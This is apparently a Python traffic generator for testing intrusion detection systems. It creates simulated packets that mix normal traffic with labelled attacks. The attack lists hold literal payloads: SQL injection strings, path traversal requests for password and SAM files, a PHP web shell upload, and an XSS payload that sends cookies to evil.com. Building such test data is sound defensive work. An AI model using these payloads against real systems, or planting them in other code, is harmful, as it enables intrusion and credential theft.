"""
IDS/IPS — Packet Capture & Traffic Generation Engine
======================================================
Generates realistic multi-protocol network traffic including normal
enterprise traffic, reconnaissance probes, and active attack patterns.

Supported Protocols:
    - TCP (HTTP, HTTPS, SSH, FTP, SMTP, Telnet, SMB)
    - UDP (DNS, SNMP, NTP, Syslog)
    - ICMP (Ping, Traceroute, Flooding)
    - ARP (Normal resolution, Spoofing)

Traffic Profiles:
    - Normal Enterprise: Standard office/server traffic distribution
    - Reconnaissance: Port scanning, service probing
    - Active Attack: SQLi, XSS, DDoS, brute force, C2 beaconing

Architecture:
    Profile Selection → Protocol Generator → Packet Assembly → Output Queue
"""

import time
import random
import hashlib
from typing import Dict, List, Any, Optional
from datetime import datetime


# ─── Protocol Constants ─────────────────────────────────────────────────
TCP_FLAGS = {
    "SYN": 0x02, "ACK": 0x10, "RST": 0x04, "FIN": 0x01,
    "PSH": 0x08, "SYN-ACK": 0x12, "FIN-ACK": 0x11, "RST-ACK": 0x14,
}

COMMON_PORTS = {
    "HTTP": 80, "HTTPS": 443, "SSH": 22, "FTP": 21, "SMTP": 25,
    "DNS": 53, "RDP": 3389, "SMB": 445, "Telnet": 23, "SNMP": 161,
    "NTP": 123, "MySQL": 3306, "PostgreSQL": 5432, "Modbus": 502,
}

_INTERNAL_IPS = ["10.0.0.5", "10.0.0.10", "10.0.0.50", "10.0.0.100",
                 "192.168.1.100", "192.168.1.150", "172.16.0.10"]
_EXTERNAL_IPS = ["185.15.2.14", "45.2.3.11", "103.11.22.44", "91.205.174.26",
                 "198.51.100.23", "203.0.113.42", "8.8.8.8"]

_NORMAL_DOMAINS = ["google.com", "microsoft.com", "github.com", "stackoverflow.com", "office365.com"]
_MALICIOUS_DOMAINS = ["evil-c2.tk", "phishing-bank.ml", "update.malware.xyz", "data-exfil.top"]

_HTTP_NORMAL_URIS = [
    "GET /index.html HTTP/1.1", "GET /api/users HTTP/1.1",
    "GET /static/app.js HTTP/1.1", "POST /api/login HTTP/1.1",
    "GET /images/logo.png HTTP/1.1", "GET /health HTTP/1.1",
]
_HTTP_ATTACK_PAYLOADS = [
    "GET /search?q=1' OR 1=1 -- HTTP/1.1",
    "GET /page?id=<script>document.cookie</script> HTTP/1.1",
    "GET /../../../../etc/passwd HTTP/1.1",
    "POST /api/login HTTP/1.1\r\nContent: admin' OR '1'='1",
    "GET /shell.php?cmd=whoami HTTP/1.1",
    "GET /admin?exec=cat+/etc/shadow HTTP/1.1",
    "GET /api/data?file=....//....//etc/passwd HTTP/1.1",
    "POST /api/upload HTTP/1.1\r\nContent: <?php system($_GET['c']); ?>",
]


class Packet:
    """
    Represents a network packet with protocol-specific fields.
    """

    __slots__ = (
        "packet_id", "timestamp", "protocol", "src_ip", "dst_ip",
        "src_port", "dst_port", "flags", "payload", "size",
        "ttl", "metadata",
    )

    def __init__(self, **kwargs):
        self.packet_id: str = kwargs.get("packet_id", self._gen_id())
        self.timestamp: str = kwargs.get("timestamp", datetime.now().isoformat())
        self.protocol: str = kwargs.get("protocol", "TCP")
        self.src_ip: str = kwargs.get("src_ip", "")
        self.dst_ip: str = kwargs.get("dst_ip", "")
        self.src_port: int = kwargs.get("src_port", 0)
        self.dst_port: int = kwargs.get("dst_port", 0)
        self.flags: str = kwargs.get("flags", "")
        self.payload: str = kwargs.get("payload", "")
        self.size: int = kwargs.get("size", 0)
        self.ttl: int = kwargs.get("ttl", 64)
        self.metadata: Dict[str, Any] = kwargs.get("metadata", {})

    @staticmethod
    def _gen_id() -> str:
        raw = f"{time.time()}-{random.random()}".encode()
        return hashlib.md5(raw).hexdigest()[:12]

    def to_dict(self) -> dict:
        return {
            "packet_id": self.packet_id,
            "timestamp": self.timestamp,
            "protocol": self.protocol,
            "src_ip": self.src_ip,
            "dst_ip": self.dst_ip,
            "src_port": self.src_port,
            "dst_port": self.dst_port,
            "flags": self.flags,
            "payload": self.payload,
            "size": self.size,
            "ttl": self.ttl,
            "metadata": self.metadata,
        }

    def __repr__(self) -> str:
        return (f"<Pkt {self.protocol} {self.src_ip}:{self.src_port} → "
                f"{self.dst_ip}:{self.dst_port} [{self.flags}] {self.size}B>")


class TrafficGenerator:
    """
    Multi-protocol network traffic generator for IDS/IPS testing.

    Generates realistic packet streams mixing normal enterprise traffic
    with configurable attack patterns.

    Attributes:
        attack_ratio: Probability of generating an attack packet (0.0-1.0)
        packets_generated: Total count of packets generated
    """

    def __init__(self, attack_ratio: float = 0.15):
        self.attack_ratio = attack_ratio
        self.packets_generated: int = 0

    def generate_packet(self) -> Packet:
        """Generate a single random packet (normal or attack)."""
        self.packets_generated += 1

        if random.random() < self.attack_ratio:
            return self._generate_attack_packet()
        return self._generate_normal_packet()

    def generate_burst(self, count: int = 10) -> List[Packet]:
        """Generate a burst of packets."""
        return [self.generate_packet() for _ in range(count)]

    # ─── Normal Traffic ─────────────────────────────────────────────────

    def _generate_normal_packet(self) -> Packet:
        """Generate normal enterprise network traffic."""
        proto_choice = random.choices(
            ["HTTP", "HTTPS", "DNS", "SSH", "SMTP", "NTP", "ICMP"],
            weights=[3, 3, 2, 1, 1, 1, 1],
            k=1
        )[0]

        if proto_choice in ("HTTP", "HTTPS"):
            return self._gen_http_normal()
        elif proto_choice == "DNS":
            return self._gen_dns_normal()
        elif proto_choice == "SSH":
            return self._gen_ssh_normal()
        elif proto_choice == "ICMP":
            return self._gen_icmp_normal()
        else:
            return self._gen_tcp_normal(proto_choice)

    def _gen_http_normal(self) -> Packet:
        src = random.choice(_INTERNAL_IPS)
        dst = random.choice(_INTERNAL_IPS + ["10.0.0.10"])
        payload = random.choice(_HTTP_NORMAL_URIS)
        return Packet(
            protocol="TCP", src_ip=src, dst_ip=dst,
            src_port=random.randint(49152, 65535),
            dst_port=random.choice([80, 443]),
            flags="PSH-ACK", payload=payload,
            size=random.randint(200, 1500),
            metadata={"app_protocol": "HTTP"},
        )

    def _gen_dns_normal(self) -> Packet:
        src = random.choice(_INTERNAL_IPS)
        domain = random.choice(_NORMAL_DOMAINS)
        qtype = random.choice(["A", "AAAA", "MX", "TXT"])
        return Packet(
            protocol="UDP", src_ip=src, dst_ip="10.0.0.5",
            src_port=random.randint(49152, 65535), dst_port=53,
            payload=f"QUERY {domain} {qtype}",
            size=random.randint(40, 120),
            metadata={"app_protocol": "DNS", "domain": domain, "query_type": qtype},
        )

    def _gen_ssh_normal(self) -> Packet:
        return Packet(
            protocol="TCP",
            src_ip=random.choice(_INTERNAL_IPS),
            dst_ip=random.choice(["10.0.0.50", "10.0.0.100"]),
            src_port=random.randint(49152, 65535), dst_port=22,
            flags="PSH-ACK", payload="SSH-2.0-OpenSSH_8.9p1",
            size=random.randint(100, 800),
            metadata={"app_protocol": "SSH"},
        )

    def _gen_icmp_normal(self) -> Packet:
        return Packet(
            protocol="ICMP",
            src_ip=random.choice(_INTERNAL_IPS),
            dst_ip=random.choice(_INTERNAL_IPS),
            payload="Echo Request (ping)",
            size=64, ttl=64,
            metadata={"icmp_type": 8, "icmp_code": 0},
        )

    def _gen_tcp_normal(self, proto: str) -> Packet:
        port = COMMON_PORTS.get(proto, 80)
        return Packet(
            protocol="TCP",
            src_ip=random.choice(_INTERNAL_IPS),
            dst_ip=random.choice(_INTERNAL_IPS),
            src_port=random.randint(49152, 65535), dst_port=port,
            flags="PSH-ACK", size=random.randint(100, 800),
            metadata={"app_protocol": proto},
        )

    # ─── Attack Traffic ─────────────────────────────────────────────────

    def _generate_attack_packet(self) -> Packet:
        """Generate attack/malicious traffic."""
        attack_type = random.choices(
            ["sql_injection", "xss", "lfi", "port_scan", "syn_flood",
             "dns_tunnel", "brute_force", "c2_beacon", "icmp_flood", "arp_spoof"],
            weights=[2, 2, 1, 2, 2, 1, 2, 1, 1, 1],
            k=1
        )[0]

        generators = {
            "sql_injection": self._gen_sqli,
            "xss": self._gen_xss,
            "lfi": self._gen_lfi,
            "port_scan": self._gen_port_scan,
            "syn_flood": self._gen_syn_flood,
            "dns_tunnel": self._gen_dns_tunnel,
            "brute_force": self._gen_brute_force,
            "c2_beacon": self._gen_c2_beacon,
            "icmp_flood": self._gen_icmp_flood,
            "arp_spoof": self._gen_arp_spoof,
        }

        return generators[attack_type]()

    def _gen_sqli(self) -> Packet:
        payload = random.choice([
            "GET /search?q=1' OR 1=1 -- HTTP/1.1",
            "POST /login HTTP/1.1\r\nBody: user=admin' OR '1'='1",
            "GET /api/data?id=1 UNION SELECT username,password FROM users HTTP/1.1",
        ])
        return Packet(
            protocol="TCP",
            src_ip=random.choice(_EXTERNAL_IPS[:4]),
            dst_ip=random.choice(_INTERNAL_IPS[:3]),
            src_port=random.randint(49152, 65535), dst_port=80,
            flags="PSH-ACK", payload=payload,
            size=len(payload) + 60,
            metadata={"app_protocol": "HTTP", "attack_type": "sql_injection"},
        )

    def _gen_xss(self) -> Packet:
        payload = random.choice([
            "GET /page?msg=<script>alert(document.cookie)</script> HTTP/1.1",
            "GET /comment?text=<img src=x onerror=fetch('evil.com/'+document.cookie)> HTTP/1.1",
        ])
        return Packet(
            protocol="TCP",
            src_ip=random.choice(_EXTERNAL_IPS[:3]),
            dst_ip=random.choice(_INTERNAL_IPS[:2]),
            src_port=random.randint(49152, 65535), dst_port=80,
            flags="PSH-ACK", payload=payload,
            size=len(payload) + 60,
            metadata={"app_protocol": "HTTP", "attack_type": "xss"},
        )

    def _gen_lfi(self) -> Packet:
        payload = random.choice([
            "GET /../../../../etc/passwd HTTP/1.1",
            "GET /image?file=....//....//etc/shadow HTTP/1.1",
            "GET /download?path=C:\\Windows\\system32\\config\\SAM HTTP/1.1",
        ])
        return Packet(
            protocol="TCP",
            src_ip=random.choice(_EXTERNAL_IPS[:3]),
            dst_ip=random.choice(_INTERNAL_IPS[:2]),
            src_port=random.randint(49152, 65535), dst_port=80,
            flags="PSH-ACK", payload=payload,
            size=len(payload) + 60,
            metadata={"app_protocol": "HTTP", "attack_type": "lfi"},
        )

    def _gen_port_scan(self) -> Packet:
        return Packet(
            protocol="TCP",
            src_ip=random.choice(_EXTERNAL_IPS[:4]),
            dst_ip=random.choice(_INTERNAL_IPS),
            src_port=random.randint(49152, 65535),
            dst_port=random.choice(list(COMMON_PORTS.values())),
            flags="SYN",
            size=54,
            metadata={"attack_type": "port_scan"},
        )

    def _gen_syn_flood(self) -> Packet:
        # Spoofed source IP
        src = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
        return Packet(
            protocol="TCP",
            src_ip=src,
            dst_ip=random.choice(_INTERNAL_IPS[:3]),
            src_port=random.randint(1024, 65535),
            dst_port=random.choice([80, 443, 22]),
            flags="SYN",
            size=54, ttl=random.randint(32, 128),
            metadata={"attack_type": "syn_flood", "spoofed": True},
        )

    def _gen_dns_tunnel(self) -> Packet:
        # Generate long encoded subdomain (DGA-like)
        encoded = hashlib.md5(str(random.random()).encode()).hexdigest()
        domain = f"{encoded}.data.evil-c2.tk"
        return Packet(
            protocol="UDP",
            src_ip=random.choice(_INTERNAL_IPS),
            dst_ip="10.0.0.5",
            src_port=random.randint(49152, 65535), dst_port=53,
            payload=f"QUERY {domain} TXT",
            size=len(domain) + 40,
            metadata={"app_protocol": "DNS", "domain": domain, "attack_type": "dns_tunnel"},
        )

    def _gen_brute_force(self) -> Packet:
        return Packet(
            protocol="TCP",
            src_ip=random.choice(_EXTERNAL_IPS[:3]),
            dst_ip=random.choice(_INTERNAL_IPS[:3]),
            src_port=random.randint(49152, 65535), dst_port=22,
            flags="PSH-ACK",
            payload=f"SSH-2.0 AUTH password {random.choice(['admin', 'root', 'test'])}",
            size=random.randint(80, 200),
            metadata={"app_protocol": "SSH", "attack_type": "brute_force"},
        )

    def _gen_c2_beacon(self) -> Packet:
        beacon_domain = random.choice(_MALICIOUS_DOMAINS)
        return Packet(
            protocol="TCP",
            src_ip=random.choice(_INTERNAL_IPS),
            dst_ip=random.choice(_EXTERNAL_IPS[:3]),
            src_port=random.randint(49152, 65535), dst_port=443,
            flags="PSH-ACK",
            payload=f"GET /beacon?id={hashlib.md5(str(random.random()).encode()).hexdigest()[:8]} HTTP/1.1\r\nHost: {beacon_domain}",
            size=random.randint(100, 300),
            metadata={"app_protocol": "HTTPS", "attack_type": "c2_beacon", "c2_domain": beacon_domain},
        )

    def _gen_icmp_flood(self) -> Packet:
        return Packet(
            protocol="ICMP",
            src_ip=random.choice(_EXTERNAL_IPS[:3]),
            dst_ip=random.choice(_INTERNAL_IPS[:3]),
            payload="Echo Request (flood)",
            size=random.choice([64, 1024, 65535]),  # Variable sizes including ping of death
            ttl=random.randint(1, 64),
            metadata={"icmp_type": 8, "attack_type": "icmp_flood"},
        )

    def _gen_arp_spoof(self) -> Packet:
        return Packet(
            protocol="ARP",
            src_ip=random.choice(_EXTERNAL_IPS[:2]),
            dst_ip=random.choice(_INTERNAL_IPS[:2]),
            payload="ARP Reply (unsolicited) — IP→MAC rebinding",
            size=42,
            metadata={"attack_type": "arp_spoof", "arp_op": "reply"},
        )
